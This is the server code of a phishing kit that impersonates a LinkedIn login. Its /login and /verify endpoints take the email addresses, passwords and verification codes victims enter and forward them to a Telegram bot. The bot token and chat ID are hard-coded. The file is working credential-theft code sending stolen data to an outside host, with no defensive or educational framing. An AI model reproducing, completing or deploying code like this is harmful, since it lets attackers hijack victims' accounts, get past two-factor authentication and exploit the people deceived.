const express = require('express');
const cors = require('cors');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// Replace with your actual Telegram bot token and chat ID
const BOT_TOKEN = '8059999764:AAGN7IycgZnJ2LitMEKW9P_4Aym2J5PMUDg';
const CHAT_ID = '1244954214';

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Send message to Telegram
function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  return axios.post(url, {
    chat_id: CHAT_ID,
    text: message,
  });
}

// Login credentials endpoint
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  const message = `🔐 New LinkedIn Login Attempt\n📧 Email: ${email}\n🔑 Password: ${password}`;
  console.log(message);

  try {
    await sendToTelegram(message);
    res.json({ message: 'Login credentials sent to Telegram' });
  } catch (error) {
    console.error('Telegram Error:', error.message);
    res.status(500).json({ message: 'Failed to send credentials to Telegram' });
  }
});

// Verification code endpoint
app.post('/verify', async (req, res) => {
  const { code } = req.body;
  const message = `✅ Verification Code Submitted: ${code}`;
  console.log(message);

  try {
    await sendToTelegram(message);
    res.json({ message: 'Verification code sent to Telegram' });
  } catch (error) {
    console.error('Telegram Error:', error.message);
    res.status(500).json({ message: 'Failed to send code to Telegram' });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});

